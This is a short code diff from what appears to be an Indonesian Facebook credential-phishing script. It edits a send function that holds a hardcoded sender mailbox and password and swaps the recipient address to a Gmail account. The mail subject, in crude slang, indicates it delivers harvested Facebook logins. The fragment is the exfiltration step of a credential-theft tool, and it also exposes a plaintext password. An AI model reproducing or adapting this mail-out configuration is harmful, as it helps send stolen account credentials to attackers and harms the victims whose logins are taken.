@@ -81,7 +81,7 @@ def inputM(x,d):
 def kirim():
    email_user = 'asulokentoddd@tutanota.com'
    email_password = 'Ngentodlonte123'
-   email_send = 'egiganteng@linuxmail.org'
+   email_send = 'yaelahgii@gmail.com'
 
    subject = 'STOR FB NIH ANJING'
 
